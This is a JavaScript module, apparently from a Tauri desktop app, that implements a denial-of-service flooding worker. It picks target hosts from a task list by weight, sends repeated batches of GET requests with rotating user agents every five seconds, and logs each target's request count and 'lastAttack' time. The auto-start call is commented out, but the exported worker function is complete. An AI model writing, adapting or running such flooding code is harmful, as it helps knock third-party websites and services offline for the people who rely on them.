import weightedRandom from 'weighted-random';
import state from '@/utils/state.js';

let statusWorker = false;
const shootIntervalSeconds = 5;

async function fetchWithTimeout(resource, proto) {
  const fetchOptions = {
    method: 'GET',
    headers: { 'User-Agent': state.userAgents },
    timeout: 8000,
    responseType: 2, // https://tauri.studio/docs/api/js/enums/http.responsetype/
  };

  try {
    await window.__TAURI__.http.fetch(`${proto}://${resource}`, fetchOptions);
  } catch (e) {
    return '';
  }
  return '';
}

const createFetchesArray = () => {
  const fetchArray = [];
  for (let i = 1; i <= shootIntervalSeconds * state.limitRequestsPerSecond; i++) {
    const randomUrlIdx = weightedRandom(state.weight);
    const { host, proto, _id } = state.tasks[randomUrlIdx];
    fetchArray.push(fetchWithTimeout(host, proto));
    state.totalRequests += 1;
    state.log[_id] = {
      ...state.log[_id],
      count: state.log[_id].count + 1,
      lastAttack: new Date(),
    };
  }
  return fetchArray;
};

const worker = async () => {
  if (!state.tasks.length) {
    statusWorker = false;
    return false;
  }
  state.startWorker = +new Date();
  state.totalRequests = 0;

  // eslint-disable-next-line
  while (1) {
    const fetches = createFetchesArray();
    try {
      Promise.all(fetches);
    } catch {
      console.log('Somewhere has been rejected, current requests =>', state.totalRequests);
    }
    await new Promise((r) => setTimeout(r, shootIntervalSeconds * 1000));
  }
};

const startWorker = () => {
  if (!statusWorker) {
    statusWorker = true;
    // worker();
  }
};

export { startWorker };
export default worker;
